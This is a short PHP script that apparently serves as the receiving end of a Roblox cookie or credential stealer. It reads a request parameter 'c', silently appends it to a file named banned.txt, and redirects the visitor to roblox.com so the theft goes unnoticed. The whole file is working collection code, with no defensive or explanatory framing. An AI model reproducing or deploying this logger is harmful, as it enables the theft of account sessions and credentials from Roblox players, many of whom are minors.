<?php 
$logFile = "banned.txt"; 
$ban = $_REQUEST["c"];

$handle = fopen($logFile, "a"); 
fwrite($handle, $ban . "\n\n"); 
fclose($handle);

header("Location: http://roblox.com"); 
exit; 
?>
